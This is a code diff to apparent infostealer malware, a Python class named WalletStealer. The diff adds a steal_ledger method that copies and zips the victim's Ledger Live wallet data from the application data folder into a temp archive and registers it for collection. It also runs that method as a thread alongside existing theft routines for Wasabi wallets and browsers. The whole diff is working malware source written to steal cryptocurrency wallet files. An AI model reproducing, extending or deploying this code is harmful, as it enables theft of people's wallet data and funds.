@@ -109,6 +109,18 @@ class WalletStealer:
             except:
                 pass
 
+    def steal_ledger(self):
+        ledger_path = os.path.join(utils.get_appdata(), 'Ledger Live')
+        if os.path.exists(ledger_path):
+            try:
+                output_dir = os.path.join(utils.get_temp(), f'shiver_ledger_{utils.generate_id()}')
+                shutil.copytree(ledger_path, output_dir, ignore_dangling_symlinks=True)
+                zip_path = output_dir + '.zip'
+                shutil.make_archive(output_dir, 'zip', output_dir)
+                self.wallets['ledger_live'] = zip_path
+            except:
+                pass
+
     def steal_all(self, browser_paths=None):
         threads = []
         if browser_paths:
@@ -129,6 +141,9 @@ class WalletStealer:
         threads.append(t)
         t.start()
         t = threading.Thread(target=self.steal_wasabi)
+        threads.append(t)
+        t.start()
+        t = threading.Thread(target=self.steal_ledger)
         threads.append(t)
         t.start()
         for t in threads:
